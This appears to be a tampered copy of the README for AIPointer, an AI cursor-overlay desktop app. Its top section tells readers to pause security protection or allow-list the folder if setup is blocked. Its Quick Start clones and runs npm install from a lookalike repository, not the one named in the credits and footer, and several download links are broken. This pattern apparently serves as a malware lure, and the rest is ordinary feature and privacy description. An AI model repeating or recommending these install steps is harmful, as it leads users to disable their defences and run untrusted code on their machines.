
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/shogunsystemhovel/aipointer-320.git
cd aipointer-320
npm install
npm start
```


<div align="center">

<img width="84" height="84" alt="AIPointer icon" src="https://github.com/shogunsystemhovel/aipointer-320/9037b6e6-f525-40fa-a386-67512a4f05ad" />

<h1>AIPointer ⦿</h1>

<p><strong>The AI cursor companion. Hold a key, ask a question, get an answer about whatever your cursor is pointing at.</strong></p>

<p>
  <a href=" Apple Silicon</strong></a> ·
  <a href=" Intel</strong></a> ·
  <a href=" ·
  <a href="
<br><br>
  🖱️ 
</p>

<img width="800" height="450" alt="AIPointer screenshot" src="https://github.com/shogunsystemhovel/aipointer-320/3d174dda-b961-4ce8-8474-e05e07e27009" />

</div>


<br>
<div align="center">

<sub>If AIPointer ⦿ is useful to you,<br>
<a href="https://github.com/gonemedia/aipointer">a star 🌟 on GitHub</a> helps the project stay alive.</sub>

</div>
</div>

---

## What it is

AIPointer is an open-source desktop overlay. You hold a key (default: Right-Cmd on macOS, Right-Ctrl on Windows/Linux), a glassmorphism box pops up next to your cursor, you ask a question, and a vision-capable LLM answers about whatever's around the cursor. A screenshot of the cursor region, your prompt, and (optionally) your clipboard get sent to the provider you configured. You keep your own API key, you pay for your own tokens, nothing is logged anywhere.

BSL-1.1 source-available, no framework lock-in, no cloud account. For longer autonomous tasks, AIPointer points you at [Skales](https://skales.app), the same author's larger AI agent.

## Common use cases

AIPointer is useful when you want to ask an AI about something on your screen without copying, pasting, or switching apps:

- **Quick translation** of text you're reading in any app or website
- **Explain code** in your editor without leaving it
- **Identify** an object, product, landmark, or chart from a screenshot
- **Summarize** a long article or document you have open
- **Get a reply suggestion** for a message visible on screen
- **Define a word** without leaving your current app
- **Solve a math or logic problem** by pointing at it
- **Voice queries** when typing isn't convenient

It works as an alternative to switching to ChatGPT, Claude, or Gemini in a browser tab — you stay where you are, the answer comes to you.

---
## Demo

<br>
<a href="https://youtu.be/NRIlG32hvLg">
  <img src="https://img.youtube.com/vi/NRIlG32hvLg/maxresdefault.jpg" alt="AIPointer demo" width="720">
</a>

<br>

## Why use it

- **Cursor-anchored.** It answers about what you're already looking at, not what you have to describe in text.
- **Fast.** Vision-capable Gemini 3 Flash by default. Sub-2-second answers for most questions.
- **Multi-provider.** Bring your own OpenRouter key (recommended) or a direct Anthropic, OpenAI, or Google Gemini key. Fallback chain handles outages automatically.
- **Voice in and voice out.** Microphone input with auto-stop on silence. Text-to-speech read-aloud for the answer. Optional voice-first conversation mode: trigger opens listening, transcript auto-submits, answer is read back, mic re-opens for follow-up. Hands-free loop.
- **Region screenshots.** While the box is open, hold the trigger key again and drag a rectangle to capture exactly the region you want. Replaces the default cursor-centered crop for that query.
- **API key tester.** A Test button per provider checks the key against the live endpoint. For OpenRouter the result includes your remaining credit balance.
- **Templates that work.** `/summary`, `/brief`, `/translate`, `/explain`, `/code`, `/improve`, `/define`, `/solve`, `/reply`, `/identify`. Plain prose works too. AIPointer detects intent across languages.
- **Save the answer.** A4-styled HTML, PDF, or Markdown. Print-ready.
- **Auto-updater.** Quiet check on launch and once per day. Downloads the next version when ready, prompts you on restart. Disable in settings if you prefer manual updates.
- **Local-first.** No telemetry, no analytics, no crash reporting. Your config lives on your machine, your sessions stay on disk if you opt in.
- **Light and dark theme.** Adapts to your system in real time.


## Permissions AIPointer needs

AIPointer asks for the minimum required to do its job. Nothing else is touched.

**macOS**
- **Accessibility** *(required)* — lets AIPointer detect the global trigger hotkey from inside any app. Without this, the hotkey is dead. Grant in System Settings → Privacy & Security → Accessibility.
- **Screen Recording** *(required)* — capture the small region around your cursor for vision context. Triggers only on hotkey hold, never in the background.
- **Microphone** *(optional)* — needed only for voice input or the voice-first conversation loop. Recordings stream to the AI provider you configured and are never stored locally.

**Windows**
- No special permissions at install. Microphone prompted on first use when needed.

**Linux**
- `libsecret` (gnome-keyring) or KWallet for OS-encrypted API key storage. Without one, keys store base64-encoded with a warning banner.
- File-manager auto-attach is not supported (no universal selection mechanism across DEs). Paperclip button works.

**All platforms — network access**
Your prompts, screenshots, queued files, and voice recordings (if used) go directly to the LLM provider you configured. The auto-updater fetches `aipointer.app/updates/latest.json`. Nothing else leaves your machine. No telemetry, no analytics.


AIPointer ships a 3-state Voice engine picker in **Settings → Voice**. Fresh installs land on **System** so read-aloud and voice input work for 100% of users without any setup. Local and Cloud are explicit opt-ins.

| Engine | TTS | STT | Setup | Cost | Quality |
|---|---|---|---|---|---|
| **System** (default) | OS Web Speech API | OS Web Speech Recognition | None — works out of the box | Free | OS-native |
| **Local** (opt-in) | Kokoro 82M (ONNX) | Whisper base (GGML) | One-time ~233 MB download, offline forever after | Free | High |
| **Cloud** (opt-in) | OpenAI/Gemini/OpenRouter cascade | Same cascade | User API key | Per-token | Max |

**System** = default for fresh installs. Users carrying over the prototype `ttsMode='auto'` setting are mapped to **Cloud** so their working setup is preserved; `ttsMode='system'` users stay on **System**.


**Safety net.** Every engine fails into System with a yellow inline strip under the Read button showing the actual reason. No silent dead button. The pillbox UI is unchanged — engine routing is a behavior layer.

> An HuggingFace Inference TTS integration was prototyped earlier in this version cycle and removed before ship — too unreliable in practice. The Local engine takes the cleaner path: download once, run on the user's machine.


## Commands

- `/web <question>` force a web-grounded answer for this one query.
- `/summary <topic>` long structured doc, ready to save as A4 PDF.
- `/brief <topic>` TL;DR + 3-5 bullets.
- `/translate [language] <text>` translate visible, selected, or pasted text.
- `/explain <thing>` plain-English explainer.
- `/code <task or error>` code-focused answer with a snippet.
- `/improve <text>` rewrite for clarity and rhythm.
- `/define <word>` dictionary entry with pronunciation and example.
- `/solve <problem>` math or logic answer with steps.
- `/reply [guidance]` three reply variants for a visible message.
- `/identify [hint]` what is this object, product, or landmark.
- `/history` list past sessions (workspace).
- `/lastsession` restore the most recent saved session (useful when you closed the box by accident).
- `/settings` open settings.
- `/help` show this list.
- `/clear` dismiss the response.
- `/quit` quit AIPointer.


## Tech stack

Electron 30 · React 18 · TypeScript 5 · Tailwind 3 · Framer Motion · Vite 5 · `uiohook-napi` (global key + mouse hook) · Electron's `nativeImage` (cursor-region screenshots, no native image library) · `electron-store` + Electron `safeStorage` (config + secret storage) · `react-markdown` with `rehype-sanitize` · native `fetch` (no SDK dependency on any LLM provider).

## What it isn't

- Not a long-running autonomous agent. For multi-step automation, computer-use, persistent goals, and complex workflows, use **[Skales](https://skales.app)**. Same author, same design philosophy, much bigger scope. AIPointer will recommend it when you ask for something out of its lane.
- Not a chat app. There is no permanent thread. Sessions live until you press ESC.
- Not a model picker. You pick a provider, AIPointer picks the model.
- Not telemetry-equipped. Nothing leaves your machine except the queries you submit, to the provider you chose.

## FAQ

**Is AIPointer free?** Yes. Source is on GitHub under BSL-1.1. You bring your own API key and pay the LLM provider directly.

**Does it work offline?** No. The vision-capable LLMs run server-side. AIPointer itself runs locally, but the answers come from your chosen provider.


**Does it collect my data?** No telemetry, no analytics. Your prompts and screenshots go directly to the LLM provider you configured.

**Does it work on macOS / Windows / Linux?** Yes, all three.

**How does it compare to other AI overlay tools?** AIPointer is single-shot Q&A with vision and bounded tools. For longer autonomous tasks and multi-step automation, use [Skales](https://skales.app).

## Privacy

- Screenshots (a 1024 × 768 region around your cursor) and any clipboard text you don't dismiss go only to the LLM provider you configured. Nowhere else.
- API keys are stored in your OS keychain (macOS Keychain, Windows DPAPI, Linux libsecret) via Electron `safeStorage`. The local config file is plain JSON with encrypted key fields.
- No telemetry, no analytics, no crash reporting.
- The auto-updater fetches `aipointer.app/updates/latest.json` on launch and once per day. The request contains no user identifier, only a standard HTTPS request to a static file. Disable in settings if you want manual updates instead.
- Full disclaimer in Settings → About and at [aipointer.app/privacy](https://aipointer.app/privacy).

## Documentation

- [CHANGELOG.md](CHANGELOG.md) release history.

## Credits

Built by **[Mario Simic](https://github.com/talentsache)** in Vienna, May 2026. Same author behind **[Skales](https://skales.app)**, an open-source local AI agent.

## License

**Business Source License 1.1.** See [LICENSE](LICENSE), [NOTICE.md](NOTICE.md), and [COMMERCIAL-LICENSE.md](COMMERCIAL-LICENSE.md).

Free for personal, educational, and internal business use. Source remains public on GitHub — fork it, audit it, build on it. Commercial redistribution, SaaS hosting, white-labeling, bundling, and resale require a written commercial license from the Licensor (dev@mariosimic.at). Reverts automatically to Apache 2.0 on 2030-05-19. The DNA marks in [docs/AUTHORSHIP.md](docs/AUTHORSHIP.md) help identify cases where license compliance has been violated.

---

<div align="center">

**aipointer.app** · **[github.com/gonemedia/aipointer](https://github.com/gonemedia/aipointer)** · **[aipointer.app](https://aipointer.app)**

No telemetry. No cloud. BSL-1.1.

</div>


<!-- Last updated: 2026-06-06 17:50:33 -->
